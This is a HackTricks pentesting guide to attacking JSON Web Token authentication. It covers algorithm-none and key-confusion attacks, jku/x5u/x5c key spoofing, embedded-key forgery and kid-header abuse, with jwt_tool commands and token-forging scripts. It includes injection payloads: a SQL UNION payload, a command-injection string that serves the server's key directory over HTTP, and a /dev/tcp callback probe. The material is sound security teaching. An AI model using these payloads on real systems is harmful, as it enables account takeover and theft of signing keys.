# JWT Vulnerabilities (Json Web Tokens)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

**Part of this post was taken from:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Author of the great tool to pentest JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Quick Wins**

Run [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) with mode `All Tests!` and wait for green lines

```bash
python3 jwt_tool.py -M at \
    -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
    -rh "Authorization: Bearer eyJhbG...<JWT Token>"
```

If you are lucky the tool will find some case where the web application is incorrectly checking the JWT:

![](<../.gitbook/assets/image (435).png>)

Then, you can search the request in your proxy or dump the used JWT for that request using jwt\_ tool:

```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```

### Tamper data without modifying anything

You can just tamper with the data leaving the signature as is and check if the server is checking the signature. Try to change your username to "admin" for example.

#### **Is the token checked?**

* If an error message occurs the signature is being checked - read any verbose error info that might leak something sensitive.
* If the page returned is different the signature is being checked.
* If the page is the same then the signature is not being checked - time to start tampering the Payload claims to see what you can do!

### Origin

Check where the token originated in your proxy's request history. It should be created on the server, not the client.

* If it was first seen coming from the client-side then the **key** is accessible to client-side code - seek it out!
* If it was first seen coming from the server then all is well.

### Duration

Check if the token lasts more than 24h... maybe it never expires. If there is a "exp" filed, check if the server is correctly handling it.

### Brute-force HMAC secret

[**See this page.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Modify the algorithm to None (CVE-2015-9235)

Set the algorithm used as "None" and remove the signature part.

Use the Burp extension call "JSON Web Token" to try this vulnerability and to change different values inside the JWT (send the request to Repeater and in the "JSON Web Token" tab you can modify the values of the token. You can also select to put the value of the "Alg" field to "None").

### Change the algorithm RS256(asymmetric) to HS256(symmetric) (CVE-2016-5431/CVE-2016-10555)

The algorithm HS256 uses the secret key to sign and verify each message.\
The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.

If you change the algorithm from RS256 to HS256, the back end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature.

Then, using the public key and changing RS256 to HS256 we could create a valid signature. You can retrieve the certificate of the web server executing this:

```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

### New public key inside the header

An attacker embeds a new key in the header of the token and the server uses this new key to verify the signature (CVE-2018-0114).

This can be done with the "JSON Web Tokens" Burp extension.\
(Send the request to the Repeater, inside the JSON Web Token tab select "CVE-2018-0114" and send the request).

### JWKS Spoofing

If the token uses a “jku” Header claim then check out the provided URL. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service you can monitor traffic for.

If you get an HTTP interaction you now know that the server is trying to load keys from the URL you are supplying. _Use jwt\_tool's -S flag alongside the -u_ [_http://example.com_](http://example.com) _argument to generate a new key pair, inject your provided URL, generate a JWKS containing the Public Key, and sign the token with the Private Key_

### Kid issues

`kid` is an optional header claim which holds a key identifier, particularly useful when you have multiple keys to sign the tokens and you need to look up the right one to verify the signature.

#### "kid" issues - reveal key

If the claim "kid" is used in the header, check the web directory for that file or a variation of it. For example if `"kid":"key/12345"` then look for _/key/12345_ and _/key/12345.pem_ on the web root.

#### "kid" issues - path traversal

If the claim "kid" is used in the header, check if you can use a different file in the file system. Pick a file you might be able to predict the content of, or maybe try `"kid":"/dev/tcp/yourIP/yourPort"` to test connectivity, or even some **SSRF** payloads...\
_Use jwt\_tool's -T flag to tamper the JWT and change the value of the kid claim, then choose to keep the original signature_

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

Using files inside the host with known content you can also forge a valid JWT. For example, in linux systems the file `/proc/sys/kernel/randomize_va_space` has the value set to **2**. So, putting that **path** inside the "**kid**" parameter and using "**2**" as the **symetric password** to generate the JWT you should be able to generate a valid new JWT.

#### "kid" issues - SQL Injection

In a scenario wehre the content of the "kid" is used to retreive the password from the database, you could change the payload inside the "kid" parameter to: `non-existent-index' UNION SELECT 'ATTACKER';-- -` and then sign the JWT with the secret key `ATTACKER`.

#### "kid" issues - OS Injection

In a scenario where the "kid" parameter contains a path to the file with the key and this path is being used **inside an executed command** you could be able to obtain RCE and expose the private key with a payload like the following: `/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### Miscellaneous attacks

The following are known weaknesses that should be tested for.

**Cross-service relay attacks**

Some web applications use a trusted JWT ‘service’ to generate and manage tokens for them. In the past some instances have occurred where a token generated for one of the JWT services’ clients can actually be accepted by another of the JWT services’ clients.\
If you observe the JWT being issued or renewed via a third-party service then it is worth identifying if you can sign up for an account on another of that service’s clients with your same username/email. If so try taking that token and replaying it in a request to your target. Is it accepted?

* If your token is accepted then you may have a critical issue allowing you to spoof any user’s account. HOWEVER, be aware that if you are signing up on a third party application you may need to seek permission for wider testing permissions in case it enters a legal grey-area!

**Is exp checked?**

The “exp” Payload claim is used to check the expiry of a token. As JWTs are often used in the absence of session information, so they do need to be handled with care - in many cases capturing and replaying someone else’s JWT will allow you to masquerade as that user.\
One mitigation against JWT replay attacks (that is advised by the JWT RFC) is to use the “exp” claim to set an expiry time for the token. It is also important to set the relevant checks in place in the application to make sure this value is processed and the token rejected where it is expired. If the token contains an “exp” claim and test time limits permit it - try storing the token and replaying it after the expiry time has passed. _Use jwt\_tool's -R flag to read the content of the token, which includes timestamp parsing and expiry checking (timestamp in UTC)_

* If the token still validates in the application then this may be a security risk as the token may NEVER expire.

### x5u and jku

#### jku

jku stands for **JWK Set URL**.\
If the token uses a “**jku**” **Header** claim then **check out the provided URL**. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service you can monitor traffic for.

First you need to create a new certificate with new private & public keys

```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

Then you can use for example [**jwt.io**](https://jwt.io) to create the new JWT with the **created public and private keys and pointing the parameter jku to the certificate created.** In order to create a valid jku certificate you can download the original one anche change the needed parameters.

You can obtain the parametes "e" and "n" from a public certificate using:

```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```

#### x5u

X.509 URL. A URI pointing to a set of X.509 (a certificate format standard) public certificates encoded in PEM form. The first certificate in the set must be the one used to sign this JWT. The subsequent certificates each sign the previous one, thus completing the certificate chain. X.509 is defined in RFC 52807 . Transport security is required to transfer the certificates.

Try to **change this header to an URL under your control** and check if any request is received. In that case you **could tamper the JWT**.

To forge a new token using a certificate controlled by you, you need to create the certificate and extract the public and private keys:

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```

Then you can use for example [**jwt.io**](https://jwt.io) to create the new JWT with the **created public and private keys and pointing the parameter x5u to the certificate .crt created.**

![](<../.gitbook/assets/image (439).png>)

You can also abuse both of these vulns **for SSRFs**.

#### x5c

This parameter may contain the **certificate in base64**:

![](<../.gitbook/assets/image (440).png>)

If the attacker **generates a self-signed certificate** and creates a forged token using the corresponding private key and replace the "x5c" parameter’s value with the newly generatedcertificate and modifies the other parameters, namely n, e and x5t then essentially the forgedtoken would get accepted by the server.

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```

### Embedded Public Key (CVE-2018-0114)

If the JWT has embedded a public key like in the following scenario:

![](<../.gitbook/assets/image (438).png>)

Using the following nodejs script it's possible to generate a public key from that data:

```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```

It's possible to generate a new private/public key, embeded the new public key inside the token and use it to generate a new signature:

```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

You can obtain the "n" and "e" using this nodejs script:

```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```

Finally, using the public and private key and the new "n" and "e" values you can use [jwt.io](https://jwt.io) to forge a new valid JWT with any information.

### JTI (JWT ID)

The JTI (JWT ID) claim provides a unique identifier for a JWT Token. It can beused to prevent the token from being replayed.\
However, imagine a situation where the maximun length of the ID is 4 (0001-9999). The request 0001 and 10001 are going to use the same ID. So if the backend is incrementig the ID on each request you could abuse this to **replay a request** (needing to send 10000 request between each successful replay).

### JWT Registered claims

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Tools

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
